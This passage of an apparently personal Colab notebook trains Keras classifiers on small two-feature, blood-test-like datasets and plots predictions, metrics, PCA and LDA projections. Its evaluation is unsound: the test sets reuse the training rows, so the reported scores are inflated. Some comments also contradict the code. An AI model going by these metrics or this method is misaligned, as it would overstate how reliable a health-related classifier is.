#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Normalize the last column separately to achieve grayscale
#         min_pixel_value = np.min(data[i])
#         max_pixel_value = np.max(data[i])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value_last = np.min(data[:, -1])
#     max_pixel_value_last = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
#         image[i, -1] = np.array([pixel_value_last] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


#     print(""**************************"",num_training_rows,""*******************"")

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     # for i, label in enumerate(y_train):
#     #     for j in range(len(X_train[0])
#     #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#     #         image_training[i, j] = np.array([pixel_value] * 3)
#     #         image_training[i, -1] = np.array([128, 128, 128])
#     #     if label == 0:
#     #         image_training[i, -1] = np.array([0, 128, 0])
#     #     elif label == 1:
#     #         image_training[i, -1] = np.array([255, 0, 0])



#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for i, label in enumerate(y_train):
#         for j in range(len(X_train[0])):
#             pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#         if label == 0:
#             image_training[i, -1] = np.array([0, 128, 0])
#         elif label == 1:
#             image_training[i, -1] = np.array([255, 0, 0])


#     return image_training








# def create_imageN(data, predictions, label_colors=None):
#     num_training_rows = 1  # Set the number of rows to 1
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for j in range(len(X_train[0])):
#         pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[0, j] = np.array([pixel_value] * 3)

#     image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

#     label = y_train[0]
#     if label == 0:
#         image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
#     elif label == 1:
#         image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

#     return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento k√≥d otev≈ôe dialogov√© okno pro v√Ωbƒõr souboru z va≈°eho poƒç√≠taƒçe.
import io
import pandas as pd

# P≈ôedpokl√°d√°me, ≈æe jste nahr√°li CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, kter√© pot≈ôebuj√≠ b√Ωt ƒçteny jako bin√°rn√≠ objekty
  df = pd.read_csv(path)
  print(df.head())  # Vyp√≠≈°e prvn√≠ch pƒõt ≈ô√°dk≈Ø DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# P≈ôevod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

# # Compile the model
# model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])


import tensorflow as tf

# Vylep≈°en√Ω model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Pou≈æit√≠ Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])


# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 1387
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],
 [26.2042, 10.6782],
 [35.7258, 82.8027],

# [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,2],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,2],  

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=0):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction},personNEW_results: {personNEW_results}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# Rozd√Ñ‚Ä∫lenƒÇ¬≠ dat na trƒÇ¬©novacƒÇ¬≠ a testovacƒÇ¬≠ mnoƒπƒæiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(1000), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")


import random

def find_best_pair(min_val, max_val, num_features, model, min_values, max_values):
    best_pair = None
    best_prediction = 1
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction < best_prediction:
            best_prediction = prediction
            best_pair = new_data
    return best_pair, best_prediction



best_pair, best_prediction = find_best_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


def find_worst_pair(min_val, max_val, num_features, model, min_values, max_values):
    worst_pair = None
    worst_prediction = 0
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction > worst_prediction:
            worst_prediction = prediction
            worst_pair = new_data
    return worst_pair, worst_prediction



worst_pair, worst_prediction = find_worst_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


print(f""Best Pair: {best_pair}, Best Prediction: {best_prediction}"")
print(f""Worst Pair: {worst_pair}, Worst Prediction: {worst_prediction}"")

import numpy as np
import matplotlib.pyplot as plt
from sklearn.decomposition import PCA
import tensorflow as tf
from tqdm.notebook import tqdm_notebook

# Va≈°e data
# A = [
#     [23.657800719276743,18.859916797201468,0,0],
#     [22.573729142097473,17.96922325097786,0,0],
#     [32.55342396968757,29.463651408558803,0,0],
#     [6.718035041529263,25.704665468161718,2,1],
#     [14.401918566243225,16.770856492924658,0,0],
#     [17.457907312962234,21.76521470574044,0,0],
#     [20.02796946568093,73.45445954770891,2,1],
#     [30.295138369778076,62.901112886193246,2,1],
#     [15.128977804449633,32.40267702110393,0,0],
#     [30.179457395820013,58.982492125646104,2,1],
#     [28.01649701854089,63.92781357637711,2,1],
#     [16.791838457871147,42.33482314089884,0,0],
#     [10.583694293380976,19.61926728942497,0,0],
#     [26.634447074406467,91.96624817360987,2,1],
#     [26.217868623367643,36.400293587062976,0,0],
#     [17.689396788624936,60.79797114006423,2,1],
#     [33.17193822527976,66.75277364959176,2,1],
#     [23.793952755709153,22.57501437360518,0,0],
#     [37.844484133572124,36.320623921263156,2,1],
#     [35.16135413357336,33.16395078484642,2,1],
#     [29.380894071974286,25.28297332192533,0,0],
#     [31.65893504663792,73.13603413708854,2,1],
# ]

# # P≈ôevod na NumPy pole
# A = np.array(A)

# Extrakce dat a label≈Ø
X = A[:, :-1]  # V≈°echny sloupce kromƒõ posledn√≠ho jsou vstupy
y = A[:, -1]  # Posledn√≠ sloupec je label

# Normalizace dat
min_values = np.min(X, axis=0)
max_values = np.max(X, axis=0)
X_normalized = (X - min_values) / (max_values - min_values)

# Rozdƒõlen√≠ dat na tr√©novac√≠ a testovac√≠ mno≈æiny
num_training_rows = 15
X_train_normalized = X_normalized[:num_training_rows]
y_train = y[:num_training_rows]
X_test_normalized = X_normalized[num_training_rows:]
y_test = y[num_training_rows:]

# Definice a kompilace modelu
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train_normalized[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Tr√©nov√°n√≠ modelu
epochs = 138
accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

# Aplikace PCA
pca = PCA(n_components=2)  # Sn√≠≈æen√≠ na 2 komponenty
X_pca = pca.fit_transform(X_normalized)

# Vizualizace v√Ωsledk≈Ø
plt.figure()
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=y)
plt.xlabel('Prvn√≠ hlavn√≠ komponenta')
plt.ylabel('Druh√° hlavn√≠ komponenta')
plt.title('PCA na va≈°ich datech')
plt.show()

##################### LDA

X = A[:, :-1]  # V≈°echny sloupce kromƒõ posledn√≠ho jsou vstupy
y = A[:, -1]  # Posledn√≠ sloupec je label

# Normalizace dat
min_values = np.min(X, axis=0)
max_values = np.max(X, axis=0)
X_normalized = (X - min_values) / (max_values - min_values)

# Rozdƒõlen√≠ dat na tr√©novac√≠ a testovac√≠ mno≈æiny
num_training_rows = A.shape[0]

X_train_normalized = X_normalized[:num_training_rows]
y_train = y[:num_training_rows]
X_test_normalized = X_normalized[num_training_rows:]
y_test = y[num_training_rows:]

# # Definice a kompilace modelu
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train_normalized[0]),)),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(128, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

#model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

from sklearn.discriminant_analysis import LinearDiscriminantAnalysis as LDA

# Tr√©nov√°n√≠ modelu
epochs = 138
accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

# Aplikace LDA
lda = LDA(n_components=1)  # Sn√≠≈æen√≠ na 2 komponenty
X_lda = lda.fit_transform(X_normalized, y)

# # Vizualizace v√Ωsledk≈Ø
# plt.figure()
# plt.scatter(X_lda[:, 0], X_lda[:, 1], c=y)
# plt.xlabel('Prvn√≠ diskriminaƒçn√≠ komponenta')
# plt.ylabel('Druh√° diskriminaƒçn√≠ komponenta')
# plt.title('LDA na va≈°ich datech')
# plt.show()

lda = LDA(n_components=1)
X_lda = lda.fit_transform(X_train_normalized, y_train)
 

# Vizualizace v√Ωsledk≈Ø LDA
plt.figure()
plt.scatter(X_lda[:, 0], np.zeros_like(X_lda), c=y_train)
plt.xlabel('Prvn√≠ diskriminaƒçn√≠ komponenta')
plt.title('LDA s uƒçitelem')
plt.show()

###################################################################################################################


import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from sklearn.metrics import recall_score, confusion_matrix, accuracy_score, precision_score, f1_score
import seaborn as sns

# # Va≈°e data
# A = [
#     [23.657800719276743, 18.859916797201468, 0, 0],
#     [22.573729142097473, 17.96922325097786, 0, 0],
#     [32.55342396968757, 29.463651408558803, 0, 0],
#     [6.718035041529263, 25.704665468161718, 2, 1],
#     [14.401918566243225, 16.770856492924658, 0, 0],
#     [17.457907312962234, 21.76521470574044, 0, 0],
#     [20.02796946568093, 73.45445954770891, 2, 1],
#     [30.295138369778076, 62.901112886193246, 2, 1],
#     [15.128977804449633, 32.40267702110393, 0, 0],
#     [30.179457395820013, 58.982492125646104, 2, 1],
#     [28.01649701854089, 63.92781357637711, 2, 1],
#     [16.791838457871147, 42.33482314089884, 0, 0],
#     [10.583694293380976, 19.61926728942497, 0, 0],
#     [26.634447074406467, 91.96624817360987, 2, 1],
#     [26.217868623367643, 36.400293587062976, 0, 0],
#     [17.689396788624936, 60.79797114006423, 2, 1],
#     [33.17193822527976, 66.75277364959176, 2, 1],
#     [23.793952755709153, 22.57501437360518, 0, 0],
#     [37.844484133572124, 36.320623921263156, 2, 1],
#     [35.16135413357336, 33.16395078484642, 2, 1],
#     [29.380894071974286, 25.28297332192533, 0, 0],
#     [31.65893504663792, 73.13603413708854, 2, 1],
# ]

# # P≈ôevod na NumPy pole
# A = np.array(A)

# Rozdƒõlen√≠ na vstupn√≠ data (X) a c√≠lov√© promƒõnn√© (y)
X = A[:, :-1]
y = A[:, -1]

# Rozdƒõlen√≠ na tr√©novac√≠ a testovac√≠ sadu (v tomto p≈ô√≠kladƒõ pou≈æijeme celou sadu jako tr√©novac√≠ pro jednoduchost)
X_train, y_train = X, y
X_test, y_test = X, y

# Normalizace dat
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)
X_test_normalized = (X_test - min_values) / (max_values - min_values)

# Definice modelu
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(X_train_normalized.shape[1],)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Pou≈æit√≠ Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy', tf.keras.metrics.Recall()])

# Tr√©nov√°n√≠ modelu
history = model.fit(X_train_normalized, y_train, epochs=50, verbose=0, shuffle=True)

# Predikce
y_pred_prob = model.predict(X_test_normalized)
y_pred = (y_pred_prob > 0.5).astype(int)

# V√Ωpoƒçet metrik
recall = recall_score(y_test, y_pred)
conf_matrix = confusion_matrix(y_test, y_pred)

# Vyhodnocen√≠ v√Ωkonu modelu
